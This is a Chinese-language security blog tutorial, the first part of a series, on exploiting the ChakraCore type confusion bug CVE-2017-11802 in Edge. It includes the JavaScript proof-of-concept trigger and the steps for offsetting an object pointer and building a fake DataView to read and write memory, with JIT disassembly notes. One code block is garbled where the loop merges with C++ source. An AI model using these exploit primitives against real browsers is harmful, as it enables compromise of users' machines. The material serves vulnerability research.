# Edge Type Confusion利用：从type confused到内存读写
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 本篇原创文章参加双倍稿费活动，预估稿费为1000元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)
### 传送门：[Edge Type
Confusion利用：从内存读写到控制流程](https://www.anquanke.com/post/id/98775)
最近分析的ChakraCore的漏洞比较多，其中一个来源是project
zero的公开issue。因此也有一些心得，个人感觉去年Chakra漏洞的集中爆发点是各种的type
confusion漏洞，比如Proxy特性处理不当的、JIT优化不当的、
ImplicitCall处理不当的等等。去年11月POC2017上有一个议题《1-Day Browser & Kernel
Exploitation》正好是讲ChakraCore type confusion利用的，恰巧其中提及的漏洞我都有调试过。  
之前在调试这些漏洞时有说过要写关于这些漏洞的exp，恰巧可以以这个议题以及调试过几个漏洞为例来说明一下利用过程。
关于浏览器type confusion的利用个人感觉公开的资料其实不多，之前holy
nop师傅有分享过一篇CVE-2016-7201的利用，也就是在《The Secret of
ChakraCore》议题中提到的，但是没有exp代码所以细节比较模糊，此外就没有什么资料了。其实个人感觉chakra里面type
confused利用与OOB利用大同小异都是围绕DataView或者TypedArray进行的，比较不同的在于如何构造对象能够正常读写、如何保证构造的对象不会crash的过程。  
但是对于Chakra不太了解的同学可能不太容易直接通过网上现有的一些资料看懂利用的原理，这里我比较详细的给大家分享一下操作过程。
## 关于漏洞
这个漏洞利用的对象是CVE-2017-11802，这个漏洞我之前有写过分析，这里再简单描述一下
    function main() {
            let arr = [1.1, 1.1];
            function opt(f) 
            {
                arr[0] = 1.1;
                arr[1] = 2.3023e-320 + parseInt('ab'.replace('a', f));//0x1234
                return 1;
            }
            for (var i = 0; i GetEntryPoint()(
                replacefn, 
                4, 
                pThis, 
                match, 
                JavascriptNumber::ToVar((int)indexMatched, scriptContext), 
                input), 
            scriptContext);
## 背景知识
介绍利用之前需要首先理解一下javascript中数组在解析引擎中的表现形式，我们知道javascript是一个弱类型的语言，其中的数组可以保存任意类型的数据。但是对于实际的执行来说不能像在javascript中的那样任性，因为对于底层来说必须要搞清楚哪个是立即数哪个是字符串哪个是指针，否则没有办法进行处理。因此javascript任性的数据类型之下必须要底层解析引擎做更多的工作来进行弥补。在Chakra中，常见的Array分为两类一类是JavascriptNativeArray，一类是JavascriptArray（aka.
VarArray）。其中NativeArray指的是其中存放立即数的数组因此又被分为NativeIntArray、NativeFloatArray。JavascriptArray中的元素可以为指针，体现在javascript中就是这个Array中可以保存Object、String等，同时它也可以保存立即数，因为JavascriptArray中可以区分指针和立即数。在这个漏洞中
    let arr = [1.1, 1.1];
arr是NativeFloatArray类型，但是当我们向其中添加非Native元素它就会变成JavascriptArray，比如POC中的
    function exp(){
        arr[0] = {};
        return '0';
    }
但是之后的JIT依然是作为NativeArray处理的。
接下来需要给大家介绍一下相关的数据结构，首先是
## DataView
    DataView 视图是一个可以从 ArrayBuffer 对象中读写多种数值类型的底层接口，在读写时不用考虑平台字节序问题。DataView 视图是一个可以从 ArrayBuffer 对象中读写多种数值类型的底层接口，在读写时不用考虑平台字节序问题。
        DataView.prototype.getFloat32()
        DataView.prototype.getFloat64()
        DataView.prototype.getInt16()
        DataView.prototype.getInt32()
        DataView.prototype.getInt8()
        DataView.prototype.getUint16()
        DataView.prototype.getUint32()
        DataView.prototype.getUint8()
        DataView.prototype.setFloat32()
        DataView.prototype.setFloat64()
        DataView.prototype.setInt16()
        DataView.prototype.setInt32()
        DataView.prototype.setInt8()
        DataView.prototype.setUint16()
        DataView.prototype.setUint32()
        DataView.prototype.setUint8()
在这次利用中，我们的主要目的就是构造出一个能够正常读写并且不会发生crash的DataView来对内存进行操作。
    var fake_object = new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
    //省略漏洞触发部分
    opt(()=>{arr[0]=fake_object;},arr);
在原漏洞中发生类型混淆，使得原来NativeFloatArray类型的arr变为VarArray类型，并且arr[0]的内容由原本的浮点数变成指向fake_object数组的指针。
而fake_object是由`new
Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);`创建的，所以这里的fake_object自身也是个NativeArray对象，因此也满足这样的结构  
对于一个Array来说，只有segment中buffer的内容才是用户可以控制的。所以我们希望能够在buffer中伪造DataView来实现利用。
因为此时arr[0]中的指针是指向NativeArray头部的，因此需要把arr[0]中的指针加上一个偏移指向segment的buffer，对于64位的ChakraCore来说这个偏移是0x58个字节。还有需要注意的是，0x58是包含了Segment对象头部的一些域的，不是说NativeArray对象的大小就是0x58。(还有需要注意的是array对象并不一定是与segment紧邻的，只有segement较小时才是相邻的)
具体的做法是使用TypedArray取出值做+0x58的操作，这里是把Float64Array和Int32Array指向了同一个ArrayBuffer方便对一个64位数进行操作。  
此外，正常情况下是不能在VarArray中取一个Object的指针去做这种算数运算的，这里正是类型混淆后JIT未进行bailout导致的问题。
    var f64 = new Float64Array(1);
    var i32 = new Int32Array(f64.buffer);
    f64[0] = arr[0];
    //000001801D7011B4  mov         rcx,qword ptr [rax+38h]  
    //000001801D7011B8  movsd       mmword ptr [rcx],xmm0  
    var base_low = i32[0];
    var base_high = i32[1];
    i32[0] = base_low +0x58;
    /*
    000001801D7011F1  mov         rdi,qword ptr [rdx+38h]  
    000001801D7011F5  mov         r8d,dword ptr [rdi]  
    000001801D7011F8  mov         r9d,dword ptr [rdi+4]  
    000001801D7011FC  mov         r10d,r8d  
    000001801D7011FF  add         r10d,58h  
    */
    arr[0] = f64[0];
    //00001801D701209  mov         dword ptr [rdi],r10d
在进行完这步操作之后，arr[0]就指向了完全由我们控制的segment中的buffer内存，此时的情况如图所示，接下来要做的是在内存中布置一个DataView。
## 创建fake DataView
由于之前创建的fake_object是一个NativeIntArray，其中每一项是4个字节。而在Chakra中，指针等数据都是8字节表示，DataView对象的域或是其中的指针也是8个字节，所以需要分高4字节低4字节两次写入才可以。
DataView的第一项是vtable指针，在这个漏洞中目前我们还没有办法去获取到一个合法的vtable地址，所以只好填零留到后面处理。
    fake_object[0]=0x0; fake_object[1]=0x0;
    /*
        000001801D701260  mov         dword ptr [rcx+18h],edx  
        000001801D701263  xor         edx,edx  
        000001801D701265  mov         dword ptr [rcx+1Ch],edx  
    */
DataView的第二项是TypeObject的指针，对于Chakra中所有的Dynamic
Object都保存一个TypeObject的指针用于标识类型等基本信息，这称为运行时类型。这里因为不涉及控制数据访问的域，也先填零处理。
    fake_object[2]=0; fake_object[3]=0;
    //000001801D701280  mov         dword ptr [rcx+20h],edx  
    //000001801D701290  mov         dword ptr [rcx+24h],r9d
DataView的第三、四项是继承自Dynamic Object中的内容。在Chakra中Dynamic Object与Static
Object对立，只有简单的String、Boolean等Object是static的，其余的基本都是Dynamic Object。因为Dynamic
Object的值同样不涉及控制数据访问的域，这里还是对三、四项填零处理。
    fake_object[4]=0; fake_object[5]=0;
    //000001801D701294  mov         dword ptr [rcx+28h],38h
    //000001801D70129D  mov         dword ptr [rcx+2Ch],edx 
    fake_object[6]=0; fake_object[7]=0;